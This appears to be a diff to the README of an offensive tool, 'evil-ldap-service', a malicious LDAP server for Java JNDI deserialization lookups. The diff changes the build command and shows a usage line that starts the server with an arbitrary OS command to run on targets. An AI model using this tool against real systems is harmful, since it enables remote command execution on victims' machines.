@@ -7,6 +7,6 @@ Simplified LDAP service to answer a Java deserialiazed JNDI lookup.
 
 ## Usage
 
-`mvn install`
+`mvn clean package`
 
 `java -jar target/evil-ldap-service-jar-with-dependencies.jar -l <LISTEN_HOST> -lp <LDAP_PORT> -hp <HTTP_PORT> -c <OS_COMMAND>`
